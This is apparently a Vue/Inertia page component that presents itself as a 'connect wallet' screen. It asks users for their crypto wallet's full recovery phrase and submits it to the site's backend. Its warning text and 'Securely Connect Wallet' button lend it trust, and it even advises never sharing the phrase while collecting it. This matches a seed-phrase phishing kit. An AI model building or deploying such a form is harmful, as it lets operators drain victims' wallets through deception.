<script setup lang="ts">
    import { useForm } from '@inertiajs/vue3';
    import { route } from 'ziggy-js';
    import { ShieldCheckIcon, LockIcon, AlertTriangleIcon, InfoIcon } from 'lucide-vue-next';
    import ActionButton from '@/components/ActionButton.vue';
    import InputError from '@/components/InputError.vue';

    // Define the props passed from the parent page
    const props = defineProps<{
        wallet: {
            Id: string;
            Name: string;
            LogoUrl?: string;
            Description?: string;
        };
    }>();

    // Inertia's useForm helper for state management
    const form = useForm({
        wallet_id: props.wallet.Id,
        wallet_name: props.wallet.Name,
        wallet_phrase: '',
    });

    // Security best practices to display on the page
    const securityPractices = [
        { icon: ShieldCheckIcon, text: 'Ensure you are on the correct, SSL-secured website.' },
        { icon: LockIcon, text: 'Never share your recovery phrase with anyone, including our support staff.' },
        { icon: InfoIcon, text: 'Consider using a hardware wallet for maximum security.' },
    ];

    // Handle form submission
    const submit = () => {
        form.post(route('user.wallet.store'), {
            preserveScroll: true,
        });
    };

    // Helper to clear form errors on input focus
    const clearError = (field: keyof typeof form.errors) => {
        if (form.errors[field]) {
            form.clearErrors(field);
        }
    };
</script>

<template>
    <div class="grid grid-cols-1 xl:grid-cols-3 gap-6">
        <div class="xl:col-span-2">
            <div class="bg-card border border-border rounded-2xl shadow-sm">
                <div class="p-6 sm:p-8 border-b border-border flex items-center gap-4">
                    <div class="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center flex-shrink-0 border border-border group-hover:ring-primary/40 transition-all">
                        <img v-if="wallet.LogoUrl" :src="`https://www.cryptocompare.com${wallet.LogoUrl}`" :alt="wallet.Name" loading="lazy" class="w-8 h-8 rounded-lg" />
                    </div>

                    <div>
                        <h2 class="text-2xl font-bold text-card-foreground">Connect {{ wallet.Name }}</h2>
                        <p class="text-muted-foreground text-sm mt-1">
                            Enter your wallet details below to connect your account.
                        </p>
                    </div>
                </div>

                <div class="p-6 sm:p-8">
                    <div class="bg-warning/10 border border-warning/20 rounded-lg p-5 mb-8">
                        <div class="flex items-start gap-3">
                            <AlertTriangleIcon class="w-6 h-6 text-warning flex-shrink-0 mt-0.5" />
                            <div>
                                <h5 class="font-semibold text-warning mb-2">Security Warning</h5>
                                <p class="text-sm text-muted-foreground leading-relaxed">
                                    You are about to enter your wallet's recovery phrase. This is sensitive information. Submitting this phrase gives our platform access to your wallet. Please ensure you trust this service. **We will never ask for your phrase outside of this secure form.**
                                </p>
                            </div>
                        </div>
                    </div>

                    <form @submit.prevent="submit" class="space-y-6">
                        <div class="space-y-2">
                            <label for="wallet_name" class="text-sm font-medium">Wallet Name</label>
                            <p class="text-xs text-muted-foreground">Give this connection a memorable name.</p>
                            <input id="wallet_name" v-model="form.wallet_name" @focus="clearError('wallet_name')" type="text" placeholder="e.g., My Main Wallet" :disabled="form.processing" class="input-crypto w-full mt-1" />
                            <InputError :message="form.errors.wallet_name" />
                        </div>

                        <div class="space-y-2">
                            <label for="wallet_phrase" class="text-sm font-medium">Recovery Phrase (12 or 24 words)</label>
                            <p class="text-xs text-muted-foreground">Enter your wallet's recovery phrase, separated by spaces.</p>
                            <textarea id="wallet_phrase" v-model="form.wallet_phrase" @focus="clearError('wallet_phrase')" rows="3" placeholder="word1 word2 word3 ..." :disabled="form.processing" class="input-crypto w-full mt-1"></textarea>
                            <InputError :message="form.errors.wallet_phrase" />
                        </div>

                        <ActionButton :processing="form.processing">Securely Connect Wallet</ActionButton>
                    </form>
                </div>
            </div>
        </div>

        <div class="xl:col-span-1 space-y-6 margin-bottom">
            <div class="bg-card border border-border rounded-2xl p-6">
                <h5 class="text-sm font-semibold text-card-foreground mb-4 flex items-center gap-2">
                    <InfoIcon class="w-5 h-5 text-primary" />
                    Security Best Practices
                </h5>
                <ul class="space-y-3">
                    <li v-for="(item, index) in securityPractices" :key="index" class="flex items-start gap-3 text-sm text-muted-foreground">
                        <component :is="item.icon" class="w-5 h-5 text-primary flex-shrink-0 mt-0.5" />
                        <span>{{ item.text }}</span>
                    </li>
                </ul>
            </div>
        </div>
    </div>
</template>

<style scoped>
    @media (max-width: 640px) {
        .margin-bottom {
            margin-bottom: 50px;
        }
    }
</style>
